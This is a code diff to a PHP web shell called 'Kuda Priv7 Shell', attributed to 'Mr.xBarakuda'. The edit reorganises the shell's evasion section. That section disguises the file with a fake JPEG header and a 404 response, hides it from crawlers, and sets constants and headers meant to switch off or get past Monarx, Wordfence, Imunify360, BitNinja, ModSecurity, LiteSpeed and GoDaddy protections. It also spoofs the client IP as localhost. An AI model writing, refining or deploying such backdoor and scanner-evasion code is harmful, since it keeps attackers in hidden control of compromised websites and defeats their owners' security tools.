@@ -1,4 +1,4 @@
-ÿØÿ<?php
+<?php
 /*==================================#
 #          Kuda Priv7 Shell         #
 # Copyright (c) 2017 - Mr.xBarakuda #
@@ -14,7 +14,7 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 @ini_set('max_execution_time', 0);
 @clearstatcache();
-//@header("\xff\xd8\xff"); // \x89\x50\x4E\x47\x0D\x0A\x1A\x0A
+@header("ÿØÿ"); // \xff\xd8\xff
 @http_response_code(404);
 $katasandi = 'f5b165f0a2778d027ecebd64a2439c8d';
 if (!empty($_SERVER['HTTP_USER_AGENT'])) { // fucking all crawler
@@ -64,12 +64,20 @@ readfile($file);
 exit;
 }
 // Bypass Server Function by Mr.xBarakuda
-if (function_exists('okhttp_match_condition')) {
-    $condition = okhttp_match_condition($_SERVER);
-    if ($condition['country'] === 'ID') {
-        header('X-Monarx-Bypass: true');
+if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    if (!isset($apacheHeaders)) {
+        if (function_exists('apache_request_headers')) {
+            $apacheHeaders = apache_request_headers();
+        } else {
+            $apacheHeaders = [];
+        }
+    }
+    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
+        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
     }
 }
+// Monarx
 if (defined('MONARX_VERSION') || function_exists('monarx_get_headers') || isset($_SERVER['HTTP_X_MONARX'])) {
     if (defined('MONARX_VERSION')) {
         define('MONARX_DISABLE_SCAN', true);
@@ -84,37 +92,22 @@ if (defined('MONARX_VERSION') || function_exists('monarx_get_headers') || isset(
     header('X-Forwarded-For: 127.0.0.1');
     header('X-Real-IP: 127.0.0.1');
 }
-if (function_exists('litespeed_request_headers')) {
-$headers = litespeed_request_headers();
-if (isset($headers['X-LSCACHE'])) {
-    header('X-LSCACHE: off');
-}
-}
+// Wordfence
 if (defined('WORDFENCE_VERSION')) {
-define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
-define('WORDFENCE_DISABLE_FILE_MODS', true);
+    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
+    define('WORDFENCE_DISABLE_FILE_MODS', true);
 }
+// Imunify360
 if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
-$imunifyHeaders = imunify360_request_headers();
-if (isset($imunifyHeaders['X-Imunify360-Request'])) {
-    header('X-Imunify360-Request: bypass');
+    $imunifyHeaders = imunify360_request_headers();
+    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
+        header('X-Imunify360-Request: bypass');
+    }
+    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
+        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
+    }
 }
-if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
-    header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
-}
-}
-if (function_exists('apache_request_headers')) {
-$apacheHeaders = apache_request_headers();
-if (isset($apacheHeaders['X-Mod-Security'])) {
-    header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
-}
-}
-if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
-$_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
-if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
-    header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
-}
-}
+// BitNinja
 if (function_exists('bitninja_get_server_data')) {
     if (defined('BITNINJA_VERSION')) {
         define('BITNINJA_DISABLE_SCAN', true);
@@ -127,17 +120,33 @@ if (function_exists('bitninja_get_server_data')) {
     header('X-BitNinja-Simulation: bypass');
     header('X-BitNinja-Analysis: none');
 }
-if (strpos($_SERVER['HTTP_X_WEB_FACTOR'], 'GoDaddy') !== false) {
+// ModSecurity
+if (function_exists('apache_request_headers')) {
+    $apacheHeaders = isset($apacheHeaders) ? $apacheHeaders : apache_request_headers();
+    if (isset($apacheHeaders['X-Mod-Security'])) {
+        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
+    }
+}
+// CACHING (LiteSpeed)
+if (function_exists('litespeed_request_headers')) {
+    $headers = litespeed_request_headers();
+    if (isset($headers['X-LSCACHE'])) {
+        header('X-LSCACHE: off');
+    }
+}
+// GoDaddy
+if (isset($_SERVER['HTTP_X_WEB_FACTOR']) && strpos($_SERVER['HTTP_X_WEB_FACTOR'], 'GoDaddy') !== false) {
     header('X-GoDaddy-Security: bypass');
     header('X-Origin: https://google.com');
 }
-if (strpos($_SERVER['SERVER_NAME'], 'godaddy.com') !== false) {
-    $original_user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+
+if (isset($_SERVER['SERVER_NAME']) && strpos($_SERVER['SERVER_NAME'], 'godaddy.com') !== false) {
     $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
     if (defined('PHPPHP_COMPAT')) {
         define('PHPPHP_COMPAT', 'disable_php_waf_check');
     }
 }
+// Ovipanel
 if (function_exists('ovipanel_get_headers') || isset($_SERVER['HTTP_X_OVIPANEL'])) {
     if (defined('OVIPANEL_VERSION')) {
         define('OVIPANEL_DISABLE_WAF', true);
@@ -149,6 +158,13 @@ if (function_exists('ovipanel_get_headers') || isset($_SERVER['HTTP_X_OVIPANEL']
     }
     $_SERVER['HTTP_X_FORWARDED_FOR'] = '127.0.0.1';
     $_SERVER['HTTP_CLIENT_IP'] = '127.0.0.1';
+}
+// Others
+if (function_exists('okhttp_match_condition')) {
+    $condition = okhttp_match_condition($_SERVER);
+    if (isset($condition['country']) && $condition['country'] === 'ID') {
+        header('X-Monarx-Bypass: true');
+    }
 }
 if (@false) {
 function kudax_ss($array){
